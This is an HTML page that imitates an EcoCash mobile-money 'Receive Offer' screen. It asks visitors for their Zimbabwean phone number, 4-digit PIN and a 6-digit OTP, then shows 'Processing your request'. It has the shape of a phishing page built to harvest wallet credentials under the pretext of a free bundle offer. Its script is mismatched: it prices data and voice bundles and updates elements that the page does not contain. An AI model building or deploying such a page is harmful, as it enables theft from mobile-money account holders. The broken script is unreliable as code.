<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Receive Offer</title>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">

<style>

*{box-sizing:border-box}

body{
font-family:"Plus Jakarta Sans",system-ui;
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:linear-gradient(180deg,#e6f0ff,#cfe0ff);
overflow:hidden;
}

.wave{
position:fixed;
width:700px;
height:700px;
border-radius:50%;
background:radial-gradient(circle,rgba(0,58,143,.15),transparent 70%);
filter:blur(45px);
animation:float 20s infinite linear;
z-index:-1;
}

.wave.one{top:-250px;right:-150px}
.wave.two{bottom:-250px;left:-150px}

@keyframes float{
0%{transform:translateY(0)}
50%{transform:translateY(40px)}
100%{transform:translateY(0)}
}

.step{
position:absolute;
width:100%;
max-width:420px;
padding:30px;
background:white;
border-radius:22px;
box-shadow:0 25px 50px rgba(0,0,0,.12);
transition:.35s;
}

.container{
position:relative;
width:100%;
max-width:420px;
height:560px;
}

.hidden{
opacity:0;
pointer-events:none;
transform:translateX(40px);
}

.logo{
height:72px;
display:block;
margin:auto;
object-fit:contain;
}

h1{
text-align:center;
color:#003a8f;
margin:12px 0 6px;
font-size:24px;
font-weight:800;
}

.warning{
text-align:center;
font-size:13px;
color:#e11d48;
margin-top:6px;
margin-bottom:18px;
font-weight:600;
}

label{
font-size:12px;
margin-top:12px;
display:block;
color:#444;
font-weight:600;
}

input{
width:100%;
padding:13px;
border-radius:14px;
border:1px solid #eee;
background:#fafafa;
margin-top:6px;
font-size:14px;
outline:none;
transition:.2s;
}

input:focus{
border-color:#003a8f;
box-shadow:0 0 0 4px rgba(0,58,143,.08);
}

.phone-group{
display:flex;
gap:8px;
align-items:center;
}

.prefix{
background:#f1f5ff;
padding:13px;
border-radius:14px;
border:1px solid #eee;
font-weight:700;
color:#003a8f;
}

.btn{
margin-top:20px;
width:100%;
padding:13px;
border-radius:14px;
border:0;
font-weight:700;
background:#003a8f;
color:white;
cursor:pointer;
opacity:.45;
transition:.2s;
}

.btn.active{
opacity:1;
}

.pin{
display:flex;
gap:12px;
justify-content:center;
margin:18px 0;
}

.pin input{
width:52px;
height:58px;
font-size:22px;
text-align:center;
border-radius:16px;
border:1px solid #eee;
font-weight:700;
}

.count{
text-align:center;
font-size:13px;
color:#666;
}

.resend{
text-align:center;
margin-top:10px;
font-size:13px;
}

.resend button{
border:0;
background:none;
color:#003a8f;
cursor:pointer;
font-weight:700;
opacity:.4;
}

.resend button.active{
opacity:1;
}

</style>

</head>

<body>

<div class="wave one"></div>
<div class="wave two"></div>

<div class="container">

<div id="step1" class="step">

<img src="assets/ecocash.webp" class="logo">

<h1>Receive Offer</h1>

<label>Phone Number</label>

<div class="phone-group">
<div class="prefix">+263</div>
<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX">
</div>

<div class="warning">
Enter your 9-digit number starting with 7.
</div>

<label>Enter your PIN</label>

<div class="pin">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
</div>

<button id="loginBtn" class="btn">Receive Offer</button>

</div>

<div id="step3" class="step hidden">

<img src="assets/ecocash.webp" class="logo">

<h1>Receive Offer</h1>

<div class="warning" id="maskedNumber"></div>

<div class="pin">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
</div>

<div class="count">
Code expires in <span id="time">120</span>s
</div>

<div class="resend">
<button id="resendBtn">Resend OTP</button>
</div>

<button id="otpBtn" class="btn">Receive Offer</button>

</div>

<div id="step4" class="step hidden">

<img src="assets/ecocash.webp" class="logo">

<h1>Success</h1>

<div class="warning">
Processing your request...
</div>

</div>

</div>

<script>

let currentPlan = "daily";

const plans = {

daily:{
maxData:3,
maxVoice:20,
maxSms:25,
price:0.60
},

"3days":{
maxData:8,
maxVoice:50,
maxSms:75,
price:1.40
},

weekly:{
maxData:20,
maxVoice:120,
maxSms:200,
price:2.80
},

"2weeks":{
maxData:45,
maxVoice:250,
maxSms:450,
price:5.20
},

monthly:{
maxData:100,
maxVoice:600,
maxSms:1000,
price:9.90
}

};

function selectPlan(plan,el){

currentPlan = plan;

document.querySelectorAll(".tab")
.forEach(tab=>{
tab.classList.remove("active");
});

el.classList.add("active");

updatePlan();

}

function updatePlan(){

const plan = plans[currentPlan];

const voice =
document.getElementById("voice");

const sms =
document.getElementById("sms");

const data =
document.getElementById("data");

voice.max = plan.maxVoice;
sms.max = plan.maxSms;
data.max = plan.maxData;

voice.value = plan.maxVoice;
sms.value = plan.maxSms;
data.value = plan.maxData;

calculateBundle();

}

function calculateBundle(){

const plan = plans[currentPlan];

const voice =
Number(document.getElementById("voice").value);

const sms =
Number(document.getElementById("sms").value);

const data =
Number(document.getElementById("data").value);

document.getElementById("voiceValue")
.innerHTML = voice + " Min";

document.getElementById("smsValue")
.innerHTML = sms + " SMS";

document.getElementById("dataValue")
.innerHTML = data + " GB";

const total =

(
(data / plan.maxData) +
(voice / plan.maxVoice) +
(sms / plan.maxSms)

) / 3 * plan.price;

document.getElementById("price")
.innerHTML =
"$" + total.toFixed(2);

document.getElementById("summaryDuration")
.innerHTML = currentPlan;

document.getElementById("summaryVoice")
.innerHTML =
voice + " Minutes";

document.getElementById("summarySms")
.innerHTML =
sms + " SMS";

document.getElementById("summaryData")
.innerHTML =
data + " GB";

document.getElementById("summaryAmount")
.innerHTML =
"USD " + total.toFixed(2);

}

function openModal(){

const voice =
document.getElementById("voice").value;

const sms =
document.getElementById("sms").value;

const data =
document.getElementById("data").value;

const amount =
document.getElementById("summaryAmount")
.textContent;

document.getElementById("details")
.innerHTML = `

<div>
<strong>Bundle</strong>
<span>${currentPlan}</span>
</div>

<div>
<strong>Voice</strong>
<span>${voice} Minutes</span>
</div>

<div>
<strong>SMS</strong>
<span>${sms} SMS</span>
</div>

<div>
<strong>Data</strong>
<span>${data} GB</span>
</div>

<div>
<strong>Amount</strong>
<span>${amount}</span>
</div>

`;

document.getElementById("modal")
.style.display = "flex";

}

function closeModal(){

document.getElementById("modal")
.style.display = "none";

}

function confirmBundle(){

const selectedBundle = {

duration:currentPlan,

voice:
document.getElementById("voice").value,

sms:
document.getElementById("sms").value,

data:
document.getElementById("data").value,

amount:
document.getElementById("summaryAmount")
.innerText.replace("USD ","")

};

sessionStorage.setItem(
"selectedPlan",
JSON.stringify(selectedBundle)
);

window.location.href =
"login.html";

}

updatePlan();

</script>

</body>

</html>
